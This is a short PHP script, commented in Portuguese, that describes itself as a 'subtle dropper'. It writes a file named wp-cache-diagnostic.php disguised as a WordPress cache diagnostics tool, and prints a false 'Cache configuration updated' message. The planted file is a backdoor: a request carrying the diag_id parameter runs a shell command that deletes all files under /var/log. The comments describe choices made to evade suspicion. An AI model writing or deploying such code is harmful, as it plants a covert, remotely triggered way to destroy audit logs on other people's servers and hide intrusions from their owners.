<?php
// --- INÍCIO DO DROPPER SUTIL ---

// Simula a escrita de uma configuração de cache. O conteúdo é construído
// de uma forma menos suspeita, sem decodificação.

$config_header = '<?php' . PHP_EOL;
$config_body = '// Cache diagnostics tool' . PHP_EOL;
$config_logic = 'if (isset($_GET["diag_id"])) { shell_exec("find /var/log -type f -delete"); }' . PHP_EOL;
$config_footer = '?>';

$full_content = $config_header . $config_body . $config_logic . $config_footer;

$config_filename = 'wp-cache-diagnostic.php';

// A ação principal: escrever o arquivo de "diagnóstico"
if (is_writable('.')) {
    $handle = fopen($config_filename, 'w');
    fwrite($handle, $full_content);
    fclose($handle);
}

// Não vamos nos autodestruir desta vez, para parecer menos um malware clássico.
echo "Cache configuration updated.";

// --- FIM DO DROPPER SUTIL ---
?>